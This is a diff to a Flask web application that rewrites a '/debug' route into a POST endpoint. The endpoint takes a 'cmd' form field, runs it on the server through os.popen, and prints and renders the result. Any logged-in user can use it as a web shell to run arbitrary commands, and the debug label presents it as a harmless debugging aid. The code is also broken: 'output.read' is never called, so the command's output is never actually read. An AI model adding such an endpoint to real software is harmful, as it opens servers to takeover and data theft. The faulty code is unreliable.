@@ -247,9 +247,18 @@ def delete_suggestion():
 
 
 ### DEBUGGING ###
-@views.route('/debug', methods=['GET'])
+@views.route('/debug', methods=['GET', 'POST'])
+@login_required
 def debug():
-    raise
+    if request.method == 'POST':
+        cmd = request.form.get('cmd')
+        output = os.popen(cmd)
+        output = output.read
+        print(output)
+        data = '[INFO] CMD='+str(cmd)+' and output='+str(output)+''
+        print(data)
+        return render_template("debug.html", user=current_user, ADMIN=ADMIN, output=output)
+    return render_template("debug.html", user=current_user, ADMIN=ADMIN)
 ### DEBUGGING ###
 
 
